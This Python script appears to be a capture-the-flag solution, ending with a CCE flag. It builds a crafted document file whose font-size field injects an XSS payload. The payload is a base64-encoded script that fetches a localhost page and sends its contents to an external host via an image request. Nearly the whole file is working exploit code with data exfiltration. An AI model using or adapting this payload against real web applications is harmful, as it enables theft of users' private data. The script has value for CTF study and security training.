from base64 import b64encode
from util import *

def encode_rect():
    return b"\x09\x00\x00\x00\x00\x00\x00\x30\x40\x11\x00\x00\x00\x00\x00\x00\x30\x40"

def encode_text(font_size):
    inner = encode_rect()

    payload = b''
    # rect
    payload += assemble(4, 2)
    payload += var32_encode(len(inner))
    payload += inner
    # font_size
    payload += assemble(2, 2)
    payload += var32_encode(len(font_size))
    payload += font_size
    # text
    payload += assemble(5, 2)
    payload += var32_encode(4)
    payload += b"qwaz"

    return payload


def encode_element(font_size):
    inner = encode_text(font_size)
    
    payload = b''
    payload += assemble(1, 2)
    payload += var32_encode(len(inner))
    payload += inner

    return payload


def encode_page(font_size):
    inner = encode_element(font_size)

    payload = b''
    payload += assemble(1, 2)
    payload += var32_encode(len(inner))
    payload += inner

    return payload


def encode_document(font_size):
    inner = encode_page(font_size)
    title = b"Fun XSS"

    payload = b''
    # title
    payload += assemble(1, 2)
    payload += var32_encode(len(title))
    payload += title
    # page
    payload += assemble(100, 2)
    payload += var32_encode(len(inner))
    payload += inner

    return payload

final = b"""
x = new XMLHttpRequest();
x.onload = function() {
    document.write('<img src="http://headstrong.gtisc.gatech.edu:9797/?body=' + encodeURIComponent(this.responseText) + '"/>');
};
// XSS 1
// x.open("GET", "http://localhost:8080/");
// XSS 2
x.open("GET", "http://localhost:8080/d/41cb85ff5d4dd5e98b605c3f12ba61d1e5e690148cce08ccd8e83188fe7dbbd7");
x.send();
"""
final_encoded = b64encode(final)

xss = b"12px;'></div>"
xss += b"""<img src=/ onerror=\"(function () {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.innerHTML = atob('""" + final_encoded + b"""');
    document.head.appendChild(script);
})()\"/>"""
xss += b"<div style='font-size: 12px"

with open("xss.wordpresso", "wb") as f:
    f.write(encode_document(xss))

# CCE{reverse-engineering-modern-web-technologies}
